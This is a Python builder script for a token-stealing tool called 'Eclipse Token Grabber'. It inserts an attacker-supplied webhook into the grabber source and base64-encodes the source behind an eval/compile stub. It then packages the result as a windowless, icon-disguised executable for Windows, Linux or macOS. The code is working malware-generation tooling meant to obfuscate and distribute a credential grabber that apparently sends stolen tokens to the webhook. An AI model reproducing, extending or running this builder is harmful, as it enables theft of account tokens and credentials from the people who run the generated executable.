from sys import platform
import argparse
import subprocess
import base64
import os

class Builder:

    def __init__(self, webhook, out_file, os): 
        self.webhook = webhook
        self.out_file = out_file
        self.os = os
        self.path_to_pyinstaller = "/root/.wine/drive_c/users/root/Local Settings/Application Data/Programs/Python/Python38-32/Scripts/pyinstaller.exe"

    def build(self):        
        f = open("code/eclipse-grabber.py", 'r')
        file = f.read()
        f.close()
        newfile = file.replace("{WEBHOOK}", str(self.webhook))
        encoded = base64.b64encode(newfile.encode())
        f = open(self.out_file+".py", 'w')
        f.write("import base64\n")
        f.write("import os\n")
        f.write("from sys import platform\n")
        f.write("from platform import node\n")
        f.write("from getpass import getuser\n")
        f.write("from re import findall\n")
        f.write("from json import loads, dumps\n")
        f.write("from base64 import b64decode\n")
        f.write("from urllib.request import Request, urlopen\n")
        f.write("import ssl\n")
        f.write(f"eval(compile(base64.b64decode({encoded}).decode(), '<string>', 'exec'))")
        f.close()

        if self.os == "Linux":
            self.packageLinux()
        elif self.os == "Windows":
            self.packageWindows()
        elif self.os == "OSX":
            self.packageOSX()
        else:
            print("\nOS not supported\n")
        try:
            os.remove(self.out_file+".py");os.remove(self.out_file+".spec")
        except FileNotFoundError:
            pass

    def packageLinux(self):
        compile_command = ["wine", self.path_to_pyinstaller, self.out_file+".py", "--onefile", "--noconsole", "--icon=img/exe_file.ico",]
        subprocess.call(compile_command)

    def packageWindows(self):
        compile_command = ["venv/Scripts/pyinstaller.exe", "--onefile", "--noconsole", "--icon=img/exe_file.ico", self.out_file+".py"]
        subprocess.call(compile_command)

    def packageOSX(self):
        compile_command = ["pyinstaller", "--onefile", "--noconsole", "--icon=img/exe_file.ico", self.out_file+".py"]
        subprocess.call(compile_command)

def getArgs():
    parser = argparse.ArgumentParser(description='Eclipse Token Grabber Generator')
    parser.add_argument('-w', '--webhook', help='Add your webhook', default='')
    parser.add_argument('-o', '--outfile', help='Name your Executable', default='')    
    return parser.parse_args()

def checkOS():
    if platform == "linux" or platform == "linux2":
        OS = "Linux"
    elif platform == "darwin":
        OS = "OSX"
    elif platform == "win32":
        OS = "Windows"
    else:
        OS = "Unknown"
    return OS

arguments = getArgs()
if not arguments.webhook or not arguments.outfile or not arguments.webhook and not arguments.outfile:
    print("\n[-] Please Make Sure You Have Provided A Webhook And An Output File Name")

else:
    webhook = arguments.webhook
    out_file = arguments.outfile
    OS = checkOS()

    print('''

    ███████╗ ██████╗██╗     ██╗██████╗ ███████╗███████╗     ██████╗ ██████╗  █████╗ ██████╗ ██████╗ ███████╗██████╗ 
    ██╔════╝██╔════╝██║     ██║██╔══██╗██╔════╝██╔════╝    ██╔════╝ ██╔══██╗██╔══██╗██╔══██╗██╔══██╗██╔════╝██╔══██╗
    █████╗  ██║     ██║     ██║██████╔╝███████╗█████╗      ██║  ███╗██████╔╝███████║██████╔╝██████╔╝█████╗  ██████╔╝
    ██╔══╝  ██║     ██║     ██║██╔═══╝ ╚════██║██╔══╝      ██║   ██║██╔══██╗██╔══██║██╔══██╗██╔══██╗██╔══╝  ██╔══██╗
    ███████╗╚██████╗███████╗██║██║     ███████║███████╗    ╚██████╔╝██║  ██║██║  ██║██████╔╝██████╔╝███████╗██║  ██║
    ╚══════╝ ╚═════╝╚══════╝╚═╝╚═╝     ╚══════╝╚══════╝     ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝
                                                                                                                    
    Made By Dimitris Kalopisis & Yuliy Mitryashkin | Twitter: @DKalopisis & @JM1k1
    ''')

    try:
        print("\n[+] Generating Eclipse Token Grabber, please wait...")
        Builder(webhook, out_file, OS).build()
        print("\n\n[+] Succesfully Generated Eclipse Token Grabber\n\n[+] You can find it inside the dist directory")
    except Exception as e:
        print(f"\n[-] An ERROR has occurred:\n{e}")
